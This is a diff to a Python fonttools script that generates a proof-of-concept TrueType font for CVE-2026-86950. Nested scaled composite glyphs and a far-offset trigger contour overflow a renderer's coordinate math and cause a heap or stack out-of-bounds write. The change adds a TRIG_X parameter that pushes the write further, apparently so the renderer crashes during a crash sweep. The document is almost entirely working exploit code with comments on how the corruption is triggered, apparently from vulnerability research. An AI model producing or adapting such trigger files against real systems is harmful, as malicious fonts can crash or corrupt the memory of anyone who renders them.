@@ -2,13 +2,17 @@
 """CVE-2026-86950 trigger font.
 
 One leaf glyph with two contours (a small rect for the bbox, and a
-two-point line at x=32000 for the sat/trunc mismatch); nine composites
+two-point line at x=TRIG_X for the sat/trunc mismatch); nine composites
 each scaling the previous by ~2 so the leaf's x reaches ~16M font units.
 At Tf=1024, upm=16384: device_x = 16M * 1024/16384 ~ 1M -> 4096*1M > 2^31.
 
 Usage:
-  gen_font.py <out.ttf> [DX]
+  gen_font.py <out.ttf> [DX] [TRIG_X]
   DX >= 32 → malloc (heap OOB); DX <= 31 → alloca (stack OOB). Default DX=33.
+  TRIG_X is the x of the second (trigger) contour in upm; default 32000.
+  Raising TRIG_X toward 32767 (int16 max) grows the OOB offset past the
+  broken-bbox allocation — used by the Phase A crash sweep to push the
+  +16-bit write far enough to fault the renderer (crash vs stall).
 
 Requires: pip install fonttools
 """
@@ -22,9 +26,12 @@ SCALE = 32767 / 16384          # F2Dot14 max, ~1.99994
 DX    = 33                     # leaf rect width; scaled ×2⁹ → width_px ≈ DX·32
                                #   DX ≤ 31 → alloca (stack OOB)
                                #   DX ≥ 32 → malloc (heap OOB)
+TRIG_X = 32000                 # x of the 2-pt trigger contour (upm, int16)
 
 if len(sys.argv) > 2:
     DX = int(sys.argv[2])
+if len(sys.argv) > 3:
+    TRIG_X = int(sys.argv[3])
 
 fb = FontBuilder(UPM, isTTF=True)
 names = [".notdef", "leaf"] + [f"c{i}" for i in range(N - 1)] + ["A"]
@@ -34,7 +41,7 @@ fb.setupCharacterMap({ord("A"): "A"})
 # leaf: contour 0 sets bbox_x (→ coverage-buffer size); contour 1 is the 2-pt trigger
 p = TTGlyphPen(None)
 p.moveTo((0, 0));  p.lineTo((DX, 0));  p.lineTo((DX, 40));  p.lineTo((0, 40));  p.closePath()
-p.moveTo((32000, 1));  p.lineTo((32000, 39));  p.closePath()
+p.moveTo((TRIG_X, 1));  p.lineTo((TRIG_X, 39));  p.closePath()
 glyf = {"leaf": p.glyph()}
 
 # .notdef (CG requires one)
@@ -66,4 +73,4 @@ fb.font["head"].yMin = 0; fb.font["head"].yMax = 40
 
 out = sys.argv[1] if len(sys.argv) > 1 else "trigger.ttf"
 fb.save(out)
-print(f"wrote {out} (DX={DX}, {'heap' if DX >= 32 else 'stack'} OOB)")
+print(f"wrote {out} (DX={DX}, TRIG_X={TRIG_X}, {'heap' if DX >= 32 else 'stack'} OOB)")
